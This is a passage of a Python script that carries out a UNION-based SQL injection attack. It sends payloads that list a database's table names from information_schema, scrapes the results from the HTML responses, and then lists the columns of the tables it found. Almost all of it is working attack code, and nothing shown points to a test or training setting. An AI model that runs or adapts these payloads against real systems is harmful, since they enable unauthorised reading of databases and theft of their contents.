print("\n" + "=" * 80)
print("STEP 2: Extracting table names")
print("=" * 80)

table_payloads = [
    {
        'payload': f"' UNION SELECT GROUP_CONCAT(table_name),{','.join(['NULL'] * (column_count-1))} FROM information_schema.tables WHERE table_schema=database()-- ",
        'description': "Extract all table names"
    },
    {
        'payload': f"' UNION SELECT table_name,{','.join(['NULL'] * (column_count-1))} FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- ",
        'description': "Extract first table name"
    },
    {
        'payload': f"' UNION SELECT table_name,{','.join(['NULL'] * (column_count-1))} FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1-- ",
        'description': "Extract second table name"
    }
]

tables_found = []
for test in table_payloads:
    result = send_payload(test['payload'], test['description'], extract_data=True)
    
    if 'data' in result:
        tables_found.extend(result['data'])
    
    # Extract from raw text if data extraction didn't work
    text = result.get('text', '')
    table_matches = re.findall(r'>(\w+)<', text)
    if table_matches:
        interesting_tables = [t for t in table_matches if t.lower() not in ['null', 'option', 'value', 'select', 'form', 'label', 'div', 'body', 'html']]
        if interesting_tables:
            print(f"[!] Tables found in response: {interesting_tables}")
            tables_found.extend(interesting_tables)

# Step 3: Extract column names from interesting tables
print("\n" + "=" * 80)
print("STEP 3: Extracting column names")
print("=" * 80)

# If we found tables, enumerate their columns
if tables_found:
    unique_tables = list(set(tables_found))
    print(f"[+] Found tables: {unique_tables}")
    
    for table in unique_tables[:3]:  # Check first 3 tables
        if table.lower() not in ['styles', 'css', 'index', 'php', 'form']:
            print(f"\n[+] Enumerating columns for table: {table}")
            
            col_payload = f"' UNION SELECT GROUP_CONCAT(column_name),{','.join(['NULL'] * (column_count-1))} FROM information_schema.columns WHERE table_name='{table}'-- "
            send_payload(col_payload, f"Columns for {table}", extract_data=True)

